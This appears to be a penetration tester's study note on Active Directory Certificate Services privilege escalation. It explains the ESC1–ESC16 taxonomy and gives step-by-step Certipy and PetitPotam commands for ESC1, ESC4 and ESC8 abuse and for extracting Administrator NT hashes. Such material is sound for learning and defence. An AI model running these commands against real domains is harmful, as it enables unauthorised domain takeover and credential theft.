# 📌 AD Certificate Services (AD CS)

> Microsoft's PKI implementation built into AD — widely deployed, chronically misconfigured, and as of 2025 has 16 documented escalation paths straight to Domain Admin.

---

## 🔍 Definition

Active Directory Certificate Services (AD CS) is a Windows Server role that provides a PKI (Public Key Infrastructure) for issuing and managing X.509 digital certificates. These certificates are used for authentication, encryption, and code signing. Because they're tightly integrated with AD, misconfigured templates can allow a low-priv domain user to request a cert that authenticates as a Domain Admin — a path to full domain compromise. SpecterOps originally documented this in their **"Certified Pre-Owned"** whitepaper (2021), identifying the ESC attack taxonomy. As of August 2025, **16 distinct ESC techniques** (ESC1-ESC16) have been identified.

---

## 🧠 Core Concepts

- **CA (Certificate Authority)** — the server issuing certificates. An **Enterprise CA** is integrated with AD and the primary target
- **Certificate Template** — defines what a cert can be used for (EKU), who can request it, and how it's issued. Misconfigs here = ESC attacks
- **EKU (Extended Key Usage)** — OID that defines a cert's allowed uses. The dangerous ones: `Client Authentication`, `Smart Card Logon`, `Any Purpose`
- **SAN (Subject Alternative Name)** — field in the cert. If a requester can set this to an arbitrary UPN (e.g., `Administrator@corp.local`), they can get a cert that authenticates as any user
- **CSR (Certificate Signing Request)** — message sent to CA requesting a signed cert
- **Enrollment Rights** — who can request a cert from a given template. If `Domain Users` has enrollment rights on a dangerous template → ESC1
- **PKINIT** — extension allowing a cert to be used to get a Kerberos TGT. The chain: cert → TGT → NTLM hash → domain access
- **Certipy** — Python tool by ly4k for enumerating and exploiting AD CS. The go-to for all ESC attacks from Kali
- **Certify** — C# equivalent (Windows-side). Certify 2.0 released August 2025 with enhanced capabilities
- **Manager Approval** — flag on a template requiring an admin to approve cert issuance. If disabled, issuance is automatic

---

## ⚙️ How It Works (Auth via Certificate)

1. User/attacker requests a cert from the CA using a vulnerable template
2. CA issues the cert (automatically if no manager approval)
3. Client uses cert for **PKINIT** — presents cert to KDC in the AS-REQ
4. KDC validates the cert against the CA, maps it to a domain user via UPN/SAN
5. KDC issues a TGT for that user
6. Attacker uses the TGT to access domain resources, or runs **UnPAC-the-hash** to extract the NT hash

> 💡 The full ESC1 kill chain: enroll in template as `jdoe` but specify `Administrator@corp.local` in the SAN → CA issues cert for Administrator → PKINIT → TGT as Administrator → domain admin.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| ESC1 | Template allows requester to specify SAN + low-priv enrollment rights + client auth EKU |
| ESC2 | Template allows "Any Purpose" or no EKU — same abuse as ESC1 |
| ESC3 | Enrollment Agent template — allows requesting certs on behalf of other users |
| ESC4 | Low-priv user has write access to template — can modify it to be vulnerable |
| ESC5 | Low-priv user has control over the CA server object or PKI containers |
| ESC6 | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set — allows SAN in any template |
| ESC7 | Low-priv user has CA Manager or Officer role |
| ESC8 | NTLM relay to HTTP web enrollment endpoint → get cert for any authenticating user |
| ESC9/10 | Weak certificate mapping — no `objectSid` in cert, allows UPN manipulation |
| ESC11 | NTLM relay to RPC enrollment endpoint (no encryption enforced) |
| UnPAC-the-hash | Using PKINIT with a cert to extract the user's NT hash via PA-DATA |
| Pass-the-Certificate | Using a stolen cert + private key to authenticate (asymmetric PtH) |

---

## 🔥 Important Details & Gotchas

- **ESC1 and ESC8 are the most common** — Avertium found ESC8 on multiple engagements in 2025 leading to DA
- **ESC1 persistence** — certs are valid for the template's validity period (often 1-5 years), even through password changes. If the cert isn't revoked, the attacker keeps access
- **ESC8 requires network position** for relay — needs to coerce NTLM auth (PetitPotam, PrinterBug) and relay to the HTTP enrollment endpoint
- **Windows Server 2025** deploys new installations with EPA enabled by default on the web enrollment endpoint, blocking ESC8 on fresh installs — but upgraded systems may still be vulnerable
- **BeyondTrust SO-CON 2025 research** showed ESC attacks on on-prem AD CS can pivot to full cloud compromise in hybrid environments
- **Certipy BloodHound output** — Certipy can export AD CS data to BloodHound format, correlating cert template paths with AD privilege paths
- **The certificate outlasts the session** — unlike a stolen TGT (10h), a stolen/forged cert lasts years. That's the persistence angle
- **ESC4 is write-to-template** — if you have write access to a template config, you can modify it to make it ESC1-vulnerable, exploit it, then restore the original config. Certipy automates this

---

## 🌍 Real-World Usage / Examples

**Enumeration (Certipy from Kali):**
```bash
# Find all templates and CAs
certipy find -u 'user@corp.local' -p 'pass' -dc-ip <DC-IP> -stdout

# Find only vulnerable templates
certipy find -u 'user@corp.local' -p 'pass' -dc-ip <DC-IP> -vulnerable -stdout

# Export for BloodHound
certipy find -u 'user@corp.local' -p 'pass' -dc-ip <DC-IP> -bloodhound
```

**ESC1 Exploitation:**
```bash
# Request cert as Administrator via SAN
certipy req -u 'lowpriv@corp.local' -p 'pass' \
  -ca CORP-CA -template VulnTemplate \
  -upn Administrator@corp.local \
  -dc-ip <DC-IP>
# Output: Administrator.pfx

# Auth with the cert → get TGT + NT hash
certipy auth -pfx Administrator.pfx -dc-ip <DC-IP>
# Output: TGT + NT hash for Administrator
```

**ESC8 (NTLM relay to web enrollment):**
```bash
# Terminal 1: Start relay targeting CA
certipy relay -target http://<CA-IP> -template DomainController

# Terminal 2: Coerce DC to authenticate (PetitPotam)
python3 PetitPotam.py <LHOST> <DC-IP>
# Captured: cert for the DC → use for domain auth
```

**ESC4 (modify template → exploit as ESC1):**
```bash
# Check template write access in BloodHound or Certipy output
# Modify the template
certipy template -u 'lowpriv@corp.local' -p 'pass' \
  -template VulnTemplate -save-old

# Now exploit as ESC1
certipy req -u 'lowpriv@corp.local' -p 'pass' \
  -ca CORP-CA -template VulnTemplate \
  -upn Administrator@corp.local

# Restore template
certipy template -u 'lowpriv@corp.local' -p 'pass' \
  -template VulnTemplate -configuration backup-VulnTemplate.json
```

**Using the cert to get NT hash (UnPAC):**
```bash
certipy auth -pfx Administrator.pfx -dc-ip <DC-IP>
# Outputs:
# [*] Got hash for 'administrator@corp.local': aad3b435...:ntlmhash
# Use the hash for PtH
```

---

## 🔗 Related Topics

- [[Notes/Active Directory (AD)]]
- [[Kerberos Authentication]]
- [[NTLM and Pass-the-Hash]]
- [[BloodHound & Attack Path Analysis]]
- [[Lateral Movement]]
- [[LDAP Enumeration]]

---

## 📚 Sources / Further Reading

- [Certipy Wiki (ly4k)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) — ESC1-ESC16 complete reference
- [Cato CTRL — ESC1-16 Overview (Oct 2025)](https://www.catonetworks.com/blog/cato-ctrl-preventing-privilege-escalation-via-active-directory-certificate-services-adcs/) — current ESC attack surface
- [Vaadata — ESC Techniques (Sep 2025)](https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/) — practical ESC3, ESC4 walkthrough
- [BeyondTrust — ESC1 Detection Series](https://www.beyondtrust.com/blog/entry/esc1-attacks) — blue team side
- [Black Hills Infosec — ADCS Part 1](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/) — introductory ESC1 walkthrough
- HTB Academy — "AD CS Attacks" module
- HTB Machines: `Escape`, `Absolute`
